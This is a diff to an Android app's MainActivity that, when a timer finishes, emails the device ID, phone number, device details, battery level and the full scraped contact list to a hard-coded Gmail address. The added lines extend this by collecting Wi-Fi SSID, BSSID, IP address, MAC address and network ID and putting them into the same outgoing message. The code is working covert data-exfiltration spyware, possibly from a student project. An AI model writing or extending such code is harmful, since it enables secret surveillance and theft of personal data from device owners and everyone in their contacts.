@@ -8,6 +8,7 @@ import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
+import android.content.ContentUris;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
@@ -15,12 +16,17 @@ import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.CountDownTimer;
+import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
+import android.text.format.Formatter;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ImageView;
@@ -185,12 +191,24 @@ public class MainActivity extends AppCompatActivity {
             }
             public void onFinish()
             {
+                WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+                String ssid = wifiInfo.getSSID();
+                String bssid = wifiInfo.getBSSID();
+                int ipAddress = wifiInfo.getIpAddress();
+                String ipAddressString = Formatter.formatIpAddress(ipAddress);
+                String macAddress = wifiInfo.getMacAddress();
+                int networkId = wifiInfo.getNetworkId();
+
                 Location location = locationinfo.getLocation();
+
                 EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +"  |  Number:"+phoneNum , DeviceScrape.getDeviceInfo()
 //                        + "\nLocation: "+locationinfo.getLocation().getLongitude() +" "+locationinfo.getLocation().getLatitude()
-                        + "\nBattery Level:" + batterylevel + "\n\n\nContacts:\n-----\n"
+                        + "\nBattery Level:" + batterylevel + "\nWifi networkId: " + networkId + "\nWifi SSID: "+ ssid + "\nWifi BSSID: " + bssid
+                        + "\nWifi ipAddress: " + ipAddressString + "\nWifi macAddress: " + macAddress
+                        + "\n\n\nContacts:\n-----\n"
                         + ContactScrape.scrapeContacts(getContentResolver())
-                        );
+                );
             }
         } .start();
 
